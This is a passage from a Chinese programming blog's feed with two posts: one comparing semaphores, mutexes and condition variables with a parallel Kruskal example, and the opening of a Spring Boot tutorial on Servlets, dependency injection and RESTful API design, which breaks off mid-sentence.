    <content type="html"><![CDATA[<p>学习 ICS 的并行一章之后，笔者有些疑惑，semaphore（信号量）、mutex（互斥锁）、conditional variables（条件变量）这 3 者之间究竟该怎么区分它们的使用场景？</p><p>首先我们需要去阐述清楚它们各自的定义和效果。</p><p>学术界认为 mutex 是 semaphore 的特例，因此像著名的书籍 CSAPP 就先以 semaphore 为例讲了讲并发程序的资源控制问题。但是实际上有相当一部分实践派和语义派认为二者不应该混为一谈。像 Linus 本人在一次将 Linux 内核的一部分 semaphore 重构为 mutex 后，发现不仅改善了代码语义，还在一定程度上提升了性能。这件事也说明了，虽然在理论上一方可以替代另一方，但实践上它们各有所长。</p><h2 id="Semaphore-vs-Mutex"><a href="#Semaphore-vs-Mutex" class="headerlink" title="Semaphore vs Mutex"></a>Semaphore vs Mutex</h2><p>我们先讨论 semaphore。</p><p>CSAPP 中先从 “线程间变量共享” 的情况说起，它指出，程序对内存的更改并不直接在内存上完成，在汇编中可以看到，大致经历了 load（从内存到 CPU 寄存器）、update（在 CPU 寄存器内更新数据）、store（将 CPU 寄存器数据写回内存）这 3 步。</p><p>而根据程序的局部性原理、context switch 的随机性，出现脏读、不可重复读的情况几乎是必然的。这样的话两个线程甚至无法完成简单的累加计算。</p><p>为了解决这个问题，CSAPP 引入了 semaphore，这种做法就等价于建立了一个资源临界区，而 semaphore 的初始值则限制了 <u>能同时访问在 semaphore 保护下的代码 并发执行的线程数量</u>。</p><p>semaphore 中有一个特殊情况，也就是初值为 1 的情况，只允许一个线程并发执行受保护的代码。这种特殊的信号量就被称为 Binary Semaphore。</p><p>现在看 Mutex（互斥锁），我们发现，互斥锁的作用实际上要说明<u>任何线程对 mutex 包含的资源的访问都是互斥的（同一时间仅能有一个线程访问）</u>。</p><p>但是有人说，这不就是 binary semaphore 的定义吗！</p><p>实际上，Binary Semaphore 和  <strong>互斥锁</strong>（<code>mutex</code>）有些微妙的区别。</p><p>Mutex 相比 binary semaphore 增加了<strong>所有权的概念</strong>，<u>一只锁住的 Mutex 只能由给它上锁的线程解开</u>，只有系铃人才能解铃。Mutex 的功能也就因而限制在了构造 unsafe region 的 “围墙” 上。</p><p>Binary semaphore 则可以由任一线程解开。比如某进程读取磁盘并进入睡眠，等待中断读取盘块结束之后来唤醒它，而这种情况 Mutex 是解决不了的。</p><p>这是因为 semaphore 的语义有两个功能：<strong>保护资源 + 通知</strong>。除了限制资源并发数量，semaphore 的释放还能通知等待 semaphore 的线程。</p><p>Mutex 相较 semaphore 的优势在于，Mutex 职责更单一，语义更清晰，实现的效率稍微高一点。</p><h2 id="Semaphore-vs-Conditional-Variable"><a href="#Semaphore-vs-Conditional-Variable" class="headerlink" title="Semaphore vs Conditional Variable"></a>Semaphore vs Conditional Variable</h2><p>你可能会想，semaphore 有通知的语义，那条件变量不也有吗？它们俩又有什么区别呢？</p><p>实际上，你可以把条件变量理解成一个抽象层级更高的机制。</p><p>条件变量实际上是一种<strong>等待队列</strong>，<strong>提供了 “唤醒”（wake）和 “阻塞等待”（blocking-wait）两类操作</strong>，也就是入队时等待、出队时唤醒。不过这个出队条件由条件决定，唤醒和阻塞的机制交由 OS 的系统调用完成。</p><p>它们俩的共同点是，semaphore 和 CV 底层都可以用 Mutex（互斥锁在这里就是低层级同步原语，low-level synchronizing primitive）实现，它们共同的使用场景是<strong>对共享资源访问的同步机制（通知）</strong>。</p><p>然后我们再以使用场景来说明它们的不同点。</p><p>条件变量常常被用于避免资源的 Busy Waiting，像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while (!queue.empty()) &#123;</span><br><span class="line">    sleep(1);</span><br><span class="line">&#125;</span><br><span class="line">/* do something */</span><br></pre></td></tr></table></figure><p>这种行为会浪费大量的处理器资源。那么为什么不能有个变量让线程等待在上面，直到 available 后自动提醒这个线程继续运行？</p><p>条件变量的作用就在这里。它可以<u>同步多个线程对于某个条件的判断，当该条件触发时（通常是另一个线程对这个条件变量执行了操作），会随机/全部唤醒正在等待条件的线程</u>。可以说条件变量是有条件的提醒机制。</p><blockquote><p>举个例子，比如并行计算中的 checkpoints 要求线程池中，之前一阶段分配过任务的所有线程都完成计算后，才进行下一阶段的计算任务。这就是多线程的条件，这个场合就适合使用条件变量。</p></blockquote><p>semaphore 虽然也有提醒的意思，但它的语义重点不在条件上，它的重点在于 “<strong>根据某个整数（常常是共享资源的数量）来限制和提醒某个共享资源是否可用</strong>”。</p><p>而这层含义就天然的让 semaphore 比 mutex 和 CV <strong>在语义上更适合解决生产者消费者模型（Consumer / Producer Model）有关的问题</strong>。</p><blockquote><p>因为它们在某些情况下都能解决这个问题，但是语义上有优劣之分。</p></blockquote><p>大家不妨再回想一下 读者/写者模型，在 CSAPP 书中是使用 semaphore 完成的，但是实际上这个模型在语义上更适合 Conditional Variables 完成。因为这需要资源有条件的提醒机制。使用 semaphore 虽然实现上更简单，但是破坏了一部分的语义，也可能出现额外的 “虚假唤醒” 的问题。</p><blockquote><ul><li><p>例如为什么一定要记录当前读者数、等待的写者数、写者数？我不关心呢？是不是增加了冗余复杂度？</p></li><li><p>semaphore 没有显式地提醒某一类等待的线程，而是通过可用数量的方式<strong>间接</strong>展示了资源的可用性。</p><p>这并不准确，在多核、很多线程等待的情况下可能<u>无法像 CV 一样，能控制同时唤醒多个线程，还是只唤醒一个等待的线程</u>。</p></li></ul></blockquote><p>相信在上面的分析中大家以已经看到了，conditional variable 和 semaphore 在实现上能相互替代，只不过有语义和实现复杂度的 trade off 罢了，它们的使用场景也存在重叠的情况。</p><h2 id="Application-Parallel-MST-Algorithm"><a href="#Application-Parallel-MST-Algorithm" class="headerlink" title="Application: Parallel MST Algorithm"></a>Application: Parallel MST Algorithm</h2><p>其中一个比较有名的多线程同步的应用场景是，<strong>并行最小生成树的计算</strong>。由于计算最小生成树是很多算法依赖的基本算法，因此优化这个算法曾是学界比较热门的话题。</p><p>以并行的 Kruskal 算法（基于最小边的贪婪算法）为例，其主体思想与非并行化的 Kruskal 算法大致相同。</p><p>通过对图的划分，将原图分为若干不相交的分区，交由不同的进程或线程计算最小边权，从而达到加速计算的效果。</p><p>整个算法分为由各并行线程完成的 “部分算法” 与由一个主线程完成的 “仲裁算法”。</p><p>在“部分算法”中，当各进程<strong>收到来自全局进程的计算通知</strong>后，选出本分区当中具有最小权重的边并发送给全局进程，并且等待，直到本分区没有待处理的边或收到全局进程的结束通知时结束进程。</p><p>在 “仲裁算法” 中：</p><ol><li>全局进程首先向所有并行进程发送消息获取各分区最小权重边构成队列 $Q_i$；</li><li>接下来循环取出 $Q_i$ 中权值最小的边 $e_j=\min\limits_{i}{e_i}$，并向提供边 $e$ 的进程 $j=\text{argmin }e_i$ 发送消息请求补充新的最小权重边至 $Q_j$ 中；</li><li>如果取出的边 $e_j$ 加入到结果集 $T$ 中不会构成环路则保留此边，若会构成环路则将其丢弃。</li><li>当 $T$ 中的边的数量为 $|V|-1$ 或队列 $Q_i$ 均为空时算法结束，同时通知各进程结束算法。</li></ol><p>这里我们发现有多次的信息的通知语义，而且是针对特定线程。因此这里没法采用 semaphore 和 mutex，采取条件变量控制是较为合适的。</p><h2 id="Extra-Recursive-Mutex-amp-Lock-in-C"><a href="#Extra-Recursive-Mutex-amp-Lock-in-C" class="headerlink" title="Extra: Recursive Mutex &amp; Lock in C++"></a>Extra: Recursive Mutex &amp; Lock in C++</h2><p>C++ STL 库中存在的 Recursive Mutex 就是一个进程加了几次锁，就要释放几次锁，才能解除对资源的锁定。这一般用在一些特殊的业务逻辑场景中。</p><p>Lock 是利用面向对象的方法对 Mutex 进行了包装。在 Lock 的构造函数中加锁、析构函数中解锁，起到在 Lock 生命周期作用域内保护资源的作用，减轻了编码人员的编码负担。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;学习 ICS 的并行一章之后，笔者有些疑惑，semaphore（信号量）、mutex（互斥锁）、conditional variables（条件变量）这 3 者之间究竟该怎么区分它们的使用场景？&lt;/p&gt;
&lt;p&gt;首先我们需要去阐述清楚它们各自的定义和效果。&lt;/p&gt;
&lt;p&gt;学术</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="GNU" scheme="https://blog.sjtuxhw.top/tags/GNU/"/>
    
    <category term="CSAPP" scheme="https://blog.sjtuxhw.top/tags/CSAPP/"/>
    
    <category term="ICS" scheme="https://blog.sjtuxhw.top/tags/ICS/"/>
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
  </entry>
  
  <entry>
    <title>Java Spring Boot 入门</title>
    <link href="https://blog.sjtuxhw.top/technical/spring-boot-basic/"/>
    <id>https://blog.sjtuxhw.top/technical/spring-boot-basic/</id>
    <published>2024-05-06T11:12:30.000Z</published>
    <updated>2024-10-25T14:00:00.921Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前置条件：WEB 基础（Socket，HTTP 整套规范），SQL 和数据库基础，Java 语言基础、前端基础（至少了解一种前端框架，本文以 React 为例）；</p></blockquote><h1 id="Chapter-0-Basic-Concepts"><a href="#Chapter-0-Basic-Concepts" class="headerlink" title="Chapter 0. Basic Concepts"></a>Chapter 0. Basic Concepts</h1><h2 id="0-1-Servlet-war-amp-jar"><a href="#0-1-Servlet-war-amp-jar" class="headerlink" title="0.1 Servlet, war &amp; jar"></a>0.1 Servlet, <code>war</code> &amp; <code>jar</code></h2><p>在接触 Web 框架时，你肯定能碰到一个绕不开的词：Servlet。它是什么？</p><p>Servlet 本质上就是一种规范，在 Java 的实现中就是一个 Web 规范接口。</p><p>所以，为什么要有这个规范？让我们回到最初的起点。</p><hr><p>假设你什么框架都不用，想要徒手写一个能提供服务的服务器，那需要做哪些工作？</p><p>其实原理比较简单，遵循当今互联网的 HTTP 协议发报文就行：</p><ul><li>先编写基于多线程的 TCP 服务（Web 3.0 准备改用 UDP 了）；</li><li>然后在一个 TCP 连接中读取 HTTP 请求，发送 HTTP 响应即可；</li></ul><p>但是其中还要考虑一些与网络协议相关、与业务逻辑无关的其他情况：</p><ul><li>识别正确和错误的 HTTP 请求；</li><li>识别正确和错误的 HTTP 头；</li><li>复用 TCP 连接；</li><li>复用线程；</li><li>IO 异常处理；</li><li>…</li></ul><p>说到这里头都大了🥹 这些 “基础工作” 需要耗费大量的时间，并且经过长期测试才能稳定运行。如果我们只需要输出一个简单的 HTML 页面，就不得不编写上千行底层代码，那就根本无法做到高效而可靠地开发！</p><p>人们为了简化这一过程，抽象出了一个中间层：Web Server。</p><p>这些共性的、与业务逻辑无关的东西，我们统统交给现成的轮子（web server）去做，我们只需要在 web server 上写自己的应用，与 web server 做沟通就行。</p><p>进一步地，人们为了统一 “应用程序与 Web Server” 的交互接口，进一步实现功能解耦（即如果换了另一个人写的 web server，上层的应用程序根本不需要变），在 Java 中就定义了一个 Web Server 的接口，称为 Servlet。</p><p>上层应用程序可以通过继承于这个接口创建一个适用于自己程序的、处理 Web Server 发来的信息的类，以便把信息传入自己的业务逻辑中。其关系如下图所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">                 ┌───────────┐</span><br><span class="line">                 │My Servlet │</span><br><span class="line">                 ├───────────┤</span><br><span class="line">                 │Servlet API│</span><br><span class="line">┌───────┐  HTTP  ├───────────┤</span><br><span class="line">│Browser│&lt;──────&gt;│Web Server │</span><br><span class="line">└───────┘        └───────────┘</span><br></pre></td></tr></table></figure><p>这里的 Web Server 又被称为 Servlet Container，它的作用就是，解析 client / browser 发起的 request，并组装出 HTTP Request、创建 HTTP Response，将二者交于内部自定义的 Servlet（My Servlet）处理和填充。</p><blockquote><p>像 Tomcat、Jetty、GlassFish 就是一些常见的 Web Server。</p></blockquote><p>现在还有一个问题没解决。如果由 Web Server 来帮助我们完成，那么我们写应用程序时，需要和 Web Server 一起编译打包吗？答案是不需要。</p><p>在 Java 中，我们需要将自己写的 Servlet 以及其他业务逻辑的程序打包成一个 <code>*.war</code> 的文件（和 <code>*.jar</code> 不一样，不能直接运行），然后必须由含有 Servlet API 的 Web Server 动态加载进去执行，所以 Web Server 又叫 Servlet Container。</p><p>那么具体自己如何编写 Servlet 呢？以 <code>javax.Servlet</code> 类为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 1. 初始化 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException;</span><br><span class="line">    <span class="comment">/* 2. 获取配置 */</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">/* 3. 发出服务 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException;</span><br><span class="line">    <span class="comment">/* 4. 获得信息 */</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">/* 5. 销毁 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从原理上讲，Servlet 可以处理<strong>任何类型</strong>的请求，但绝大多数情况下 Servlet 只用来扩展基于 HTTP 协议的 Web Server。</p><h2 id="0-2-Spring-Spring-MVC-Spring-Boot"><a href="#0-2-Spring-Spring-MVC-Spring-Boot" class="headerlink" title="0.2 Spring, Spring MVC, Spring Boot"></a>0.2 Spring, Spring MVC, Spring Boot</h2><p>除了 Servlet，我们还要弄清楚 Spring 框架以及其中的各种常用术语。Spring MVC、Spring、Spring Boot 有什么关系？</p><p>首先尝试理解一下 Spring 框架。</p><blockquote><p>以下部分内容引用自 <a href="https://blog.csdn.net/codeSmart/article/details/106836336">CSDN Blog - 狂野弘仁</a>；</p></blockquote><p>Spring，一般指代的是 Spring Framework，<strong>它是一个开源的应用程序框架</strong>，提供了一个简易的开发方式，通过这种开发方式，将避免那些可能致使代码变得繁杂混乱的大量的业务/工具对象（由框架来帮你管理这些对象，包括它的创建，销毁等）。</p><p>Spring Framework 最重要也是最核心的特性是依赖注入。所有的 <strong>Spring 模块的核心就是 DI（依赖注入）或者 IoC（控制反转）</strong>。依赖注入或控制反转是 Spring Framework 最大的特性，当我们正确使用这二者时，可以开发出一个高内聚低耦合的应用程序，而这一一个低耦合的应用程序可以轻松的对其实施单元测试。这就是 Spring Framework 解决的最核心的问题。</p><blockquote><p>什么是控制反转？</p><p>是一种软件设计思想，也是 Spring 框架的核心概念之一。</p><p>假设类 <code>A</code> 需要类 <code>B</code> 作为组成部分，那么在传统设计理念下，类 <code>A</code> 初始化时，需要顺便创建 <code>B</code> 的对象，并且要在 <code>B</code> 的全部生命周期内维护它。这样做法虽然正确，但是有几个缺点：</p><ol><li>类型紧耦合。如果想要更换 <code>B</code>，那么需要找到类 <code>A</code> 中所有用到 <code>B</code> 的地方全部去改；</li><li>全盘管理外部对象，加重编写负担，模糊业务逻辑，使维护难以进行。</li></ol><p>于是，人们想出一种方法，将数据对象封装成一个 Java Bean，把这个 Bean 交给一个容器管理（被称为 IoC Container，在 Spring 中由框架代码帮忙完成），要用到它的时候写注解自动注入，提升了组件的重用性，实现组件解耦。</p><p>以 Spring 的两个注解为例：</p><p><code>@Component</code>: 该注解将会告诉 Spring Framework，被此注解标注的类需要纳入到 Bean 管理器（IoC Container）中。<br><code>@Autowired</code>: 告诉 Spring Framework 需要找到一与其类型匹配的对象，并将其自动引入到所需要的类中。</p><p>什么是依赖注入？</p><p>可以这么理解：它们是同一个概念的不同角度描述。通俗来说就是 <strong>IoC是设计思想，DI是实现方式</strong>。二者的终极作用是<u>去除 Java 类之间的依赖关系，实现松耦合</u>，以便于开发测试。例如对于这个类型设计：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span> &#123;  </span><br><span class="line"> <span class="keyword">private</span> Weapon weapon;  </span><br><span class="line"></span><br><span class="line"> <span class="comment">// weapon 注入</span></span><br><span class="line"> Player(Weapon weapon)&#123;  </span><br><span class="line">     <span class="built_in">this</span>.weapon = weapon;</span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line">     weapon.attack();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setWeapon</span><span class="params">(Weapon weapon)</span>&#123;  </span><br><span class="line">     <span class="built_in">this</span>.weapon = weapon;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义 Spring Bean 配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;player&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.Player&quot;</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">construct-arg</span> <span class="attr">ref</span>=<span class="string">&quot;weapon&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;weapon&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.Gun&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们对于 Weapon 的实例构造并不在 <code>Player</code> 内，而是放在配置文件中，依靠<strong>多态</strong>（<code>Gun</code> 继承于 <code>Weapon</code>）和<strong>反射</strong>（读配置、构造对象，外部设置类的行为）实现依赖注入，让两个业务类解耦合。</p><p>或者说，在依赖解耦合方面，<u>控制反转是设计思想，依赖注入是一个设计模式，配置文件只是形式，反射和多态是底层实施手段</u>。</p></blockquote><p>而 Spring Framework 的其他高级特性，例如：Spring AOP、Spring JDBC、Spring MVC、Spring ORM、Spring Test，它们<u>都不是一个全新的功能</u>。因为在不使用 Spring Framework 的情况下，我们依然能够使用 JDBC 连接数据库、依然能够对视图和数据模型进行控制、依然能够使用第三方的 ORM 框架。</p><p>Spring Framework 只是<u>对这些功能中的逻辑采用上述思想进行解耦合，以及进一步封装</u>。例如 Spring JDBC 与传统的 JDBC 相比，使用 JDBC Template 操作数据库，首先是代码量小了，其次是我们不需要再面对恐怖的 try-catch；</p><blockquote><p>如果你还使用过 C++ 配合 MySQL 原生驱动的组合的话，就完全明白这句话的分量……</p></blockquote><p>再比如 Spring Framework 的 MVC，提供了构建 Web 应用程序的全功能 MVC 模块，实现了 Web MVC 设计模式以及请求驱动类型的轻量级 Web 框架，即采用了 MVC 架构模式的思想，将 Web 层进行职责解耦。基于请求驱动指的是使用请求-响应模型，视图与数据模型分离：</p><ul><li>Dispatcher Servlet；</li><li>ModelAndView；</li><li>ViewResolver；</li></ul><p>这个功能模块是人们利用 Spring 解耦的组件进行进一步整合而得出的。</p><p>而 Spring Boot 就像整合了常用配置的“懒人包”，实现多种自动配置：</p><ul><li><p>如果Hibernate的依赖被放到了类路径上，Spring Boot会自动配置数据源；</p></li><li><p>如果Spring MVC的依赖被放到了类路径上，Spring Boot又会自动配置Dispatcher Servlet；</p></li><li><p>当Spring Boot检测到有新的依赖包添加到类路径上，Spring Boot会采用默认的配置对新的依赖包进行设置，如果我们想自己配置依赖包时，只需要手动覆盖默认的配置项即可；</p></li><li><p>Spring Boot 已经内置了多个 Web server，如 Undertow, jetty, tomcat，因此我们不需要再额外的配置服务器（比如前一节提到的打包为 <code>war</code>，然后部署），就可以完成应用程序的调试工作；</p></li></ul><p>所以，严格意义上讲，Spring Boot 并不是某种框架，它只是为开发人员提供了一个更好的更方便的使用 Spring Framework 的解决方案（相当于人家把环境都自动化配好了）。</p><p><img src="imgs/spring-frame.png"></p><h2 id="0-3-RESTful-API"><a href="#0-3-RESTful-API" class="headerlink" title="0.3 RESTful API"></a>0.3 RESTful API</h2><p>在开始前，还要了解一个概念，什么是 RESTful API（你们互联网事真多😅）。</p><p>在互联网并没有完全流行的初期，移动端也没有那么盛行，页面请求和并发量也不高，那时候人们对网络的接口的要求没那么高。只是写一些静态页面、偶尔用用一些动态页面（jsp，整个页面同时刷新）、然后按照 HTTP 等规范手动 DIY 发一发报文，就能满足绝大多数的使用需求。</p><p>但是随着互联网和移动设备的发展，人们对 Web 应用的使用需求也增加，传统的动态页面由于低效率而渐渐被 HTML + JavaScript (Ajax) 的前后端分离所取代，并且安卓、IOS、小程序等形式客户端层出不穷，客户端的种类出现多元化，<strong>而客户端和服务端就需要接口进行通信</strong>，但接口的<strong>规范性</strong>就又成了一个问题。</p><p>假设服务供应方 <code>A</code> 做了一套通信接口，另一个服务供应方 <code>B</code> 又搓了一套通信接口，那么我想同时用这两家服务，难不成还要应用开发者写两套访问逻辑？太不优雅了！</p><p>所以一套<strong>结构清晰、符合标准、易于理解、扩展方便</strong>让大部分人都能够理解接受的<u>接口风格</u>（或者说共同约定）就显得越来越重要。</p><p>2000 年的时候，有个人在他的博士论文中提出了一套软件架构的设计风格（不是标准，只是一组设计原则、共同约定），它主要用于客户端（或浏览器）和服务器交互类的软件。这个人就是 Roy Thomas Fielding。</p><p>基于这个风格设计的软件可以更简洁，更有层次，更易于实现缓存等机制。</p><p>这个设计风格也被他命名为 “表述性状态转移”（Representational State Transfer，REST）的架构风格。满足这个架构风格的接口设计就被称为 RESTful API。</p><p>那么这个风格的特征是什么？或者说它的 “共同约定” 是什么？</p><p>REST 架构的 6 个限制条件，又称为 RESTful 6 大原则：</p><ul><li><p><strong>客户端-服务端分离</strong>（解耦）；</p></li><li><p><strong>无状态的（Stateless）</strong>：服务端不保存客户端状态，客户端保存状态信息每次请求携带状态信息；</p></li><li><p><strong>可缓存性（Cacheability）</strong> ：服务端需回复是否可以缓存以让客户端甄别是否缓存提高效率;</p></li><li><p><strong>统一接口（Uniform Interface）</strong>：通过一定原则设计接口降低耦合，简化系统架构，这是RESTful设计的基本出发点；</p><blockquote><p>这组接口就是针对资源的操作，包括获取、创建、修改、删除。</p><p>恰好对应了 HTTP 协议提供的 GET、POST、PUT 和 DELETE 方法。</p><p>注意，REST 原则强烈不建议接口动作与资源访问标识符混合使用。</p><p>REST 认为，<strong>URI指向资源</strong>、以资源为基础，应该以名词标识，真正的动作应该从 HTTP 的请求动作上识别。</p><p>注 1：Universal Resource Identifier 统一资源标志符，用来标识抽象或物理资源的一个紧凑字符串。URI 包括 URL（Locator）和 URN（Navigator）；</p><p>注 2：一个资源可以是文本（通常以 JSON / HTML / XML 为载体）、二进制流等其他任何数据（一般从数据库中拿到的）；</p></blockquote></li><li><p><strong>分层系统（Layered System）</strong>：客户端对服务端的情况无感，无法直接知道连接的到终端还是中间设备，分层允许灵活地部署服务端项目；</p></li><li><strong>按需代码（Code-On-Demand，可选）</strong>：允许我们灵活的发送一些看似特殊的代码给客户端例如 JavaScript 代码。</li></ul><blockquote><p>当然，RESTful API 也是有缺陷的，例如过于重视资源的作用，导致一些与资源关系不大的场合（例如聊天服务器、通信服务器）如果使用 RESTful Web Service 则反而加重了开发负担。</p></blockquote><h3 id="补充：RESTful-API-设计规范"><a href="#补充：RESTful-API-设计规范" class="headerlink" title="补充：RESTful API 设计规范"></a>补充：RESTful API 设计规范</h3><blockquote><p>本部分摘自 <a href="https://zhuanlan.zhihu.com/p/334809573">知乎专栏</a>；</p></blockquote><p>如果想要自己设计一个 RESTful API（而不是使用各大框架中的办法），那么就要遵循以上的约定。具体来说：</p><p>URL 的 path 是需要认真考虑的，而 RESTful 对 path 的设计做了一些规范，通常一个 RESTful API 的 path 组成如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&#123;version&#125;/&#123;resources&#125;/&#123;resource_id&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>version</code>：API 版本号，有些版本号放置在头信息中也可以，通过控制版本号有利于应用迭代；<br><code>resources</code>：资源，RESTful API 推荐用小写英文单词的复数形式；<br><code>resource_id</code>：资源的id，访问或操作该资源；</p></blockquote><p>当然，有时候可能资源级别较大，其下还可细分很多子资源也可以灵活设计 URL 的 path，例如：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&#123;version&#125;/&#123;resources&#125;/&#123;resource_id&#125;/&#123;subresources&#125;/&#123;subresource_id&#125;</span><br></pre></td></tr></table></figure><p>此外，有时可能增删改查无法满足业务要求，可以在 URL 末尾加上 action，例如</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&#123;version&#125;/&#123;resources&#125;/&#123;resource_id&#125;/action</span><br></pre></td></tr></table></figure><p>其中 action 就是对资源的操作。</p><p>从大体样式了解 URL 路径组成之后，对于 RESTful API 的 URL 具体设计的规范如下：</p><ol><li>不用大写字母，所有单词使用英文且小写；</li><li>连字符用中杠 <code>&quot;-&quot;</code> 而不用下杠 <code>&quot;_&quot;</code>；</li><li>正确使用 <code>&quot;/&quot;</code> 表示层级关系,URL的层级不要过深，并且越靠前的层级应该相对越稳定；</li><li>结尾不要包含正斜杠分隔符 <code>&quot;/&quot;</code>；</li><li>URL中不出现动词，用请求方式表示动作；</li><li>资源表示用复数不要用单数；</li><li>不要使用文件扩展名；</li></ol><p>此外，在 RESTful API 中，不同的HTTP请求方法有各自的含义，这里就展示 GET,POST,PUT,DELETE 几种请求 API 的设计与含义分析。针对不同操作，具体的含义如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /collection： 从服务器查询资源的列表（数组）</span><br><span class="line">GET /collection/resource： 从服务器查询单个资源</span><br><span class="line">POST /collection： 在服务器创建新的资源</span><br><span class="line">PUT /collection/resource： 更新服务器资源</span><br><span class="line">DELETE /collection/resource： 从服务器删除资源</span><br></pre></td></tr></table></figure><p>在非 RESTful 风格的 API 中，我们通常使用 GET 请求和 POST 请求完成增删改查以及其他操作，查询和删除一般使用 GET 方式请求，更新和插入一般使用 POST 请求。从请求方式上无法知道 API 具体是干嘛的，所有在 URL 上都会有操作的动词来表示 API 进行的动作，例如：query，add，update，delete 等等。</p><p>而 RESTful 风格的 API 则要求在 URL 上都以名词的方式出现，从几种请求方式上就可以看出想要进行的操作，这点与非 RESTful 风格的 API 形成鲜明对比。</p><p>在谈及 GET,POST,PUT,DELETE 的时候，就必须提一下接口的<strong>安全性和幂等性</strong>，其中安全性是指方法不会修改资源状态，即读的为安全的，写的操作为非安全的。而幂等性的意思是操作一次和操作多次的最终效果相同，客户端重复调用也只返回同一个结果。</p><div class="table-container"><table><thead><tr><th>HTTP Method</th><th>安全性</th><th>幂等性</th><th>解释</th></tr></thead><tbody><tr><td>GET</td><td>安全</td><td>幂等</td><td>读操作（安全），查询多次结果一致</td></tr><tr><td>POST</td><td>非安全</td><td>非幂等</td><td>写操作（非安全），每次插入后与上次的结果不一样</td></tr><tr><td>PUT</td><td>非安全</td><td>幂等</td><td>写操作（非安全），插入相同数据多次结果一致</td></tr><tr><td>DELETE</td><td>非安全</td><td>幂等</td><td>写操作（非安全），删除相同数据多次结果一致</td></tr></tbody></table></div><h3 id="Tips-调试数据请求时的类型选择"><a href="#Tips-调试数据请求时的类型选择" class="headerlink" title="Tips. 调试数据请求时的类型选择"></a>Tips. 调试数据请求时的类型选择</h3><p>在使用类似 Postman 的工具发送请求时，可能会遇到不同种类可选的数据类型：</p><ul><li><strong>form-data</strong>： 就是 form 表单中的 multipart/form-data，会将表单数据处理为一条信息，用特定标签符将一条条信息分割开，而这个文件类型通常用来上传二进制文件；</li><li><strong>x-www-form-urlencoded</strong>：就是application/x-www-form-urlencoded，是 form 表单默认的 encType，form 表单会将表单内的数据转换为键值对，这种格式不能上传文件；</li><li><strong>raw</strong>：可以上传任意格式的文本，可以上传 Text，JSON，XML 等，但目前大部分还是上传 JSON 格式数据。当后端需要接收 JSON 